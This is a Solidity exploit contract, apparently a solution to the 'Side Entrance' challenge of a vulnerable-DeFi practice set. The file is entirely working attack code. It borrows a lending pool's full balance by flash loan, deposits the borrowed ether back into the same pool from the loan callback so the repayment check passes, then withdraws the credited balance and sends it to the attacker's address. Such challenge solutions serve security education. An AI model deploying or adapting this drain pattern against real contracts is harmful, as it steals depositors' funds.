// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";
import "./SideEntranceLenderPool.sol";

contract SideEntranceExploit {

    using Address for address payable;

    SideEntranceLenderPool public pool;
    address payable public immutable owner;

    constructor(address poolAddress) {
        pool = SideEntranceLenderPool(poolAddress);
        owner = payable(msg.sender);
    }

    function exploit() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        owner.sendValue(address(this).balance);
        // owner.call{value: address(this).balance}("");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
        // address(pool).functionCallWithValue(
        //     abi.encodeWithSignature(
        //         "deposit()"
        //     ),
        //     msg.value
        // );
    }

    // function withdraw() external {
    //     require(msg.sender == owner, "Only owner");
    //     owner.sendValue(address(this).balance);
    // }
}
 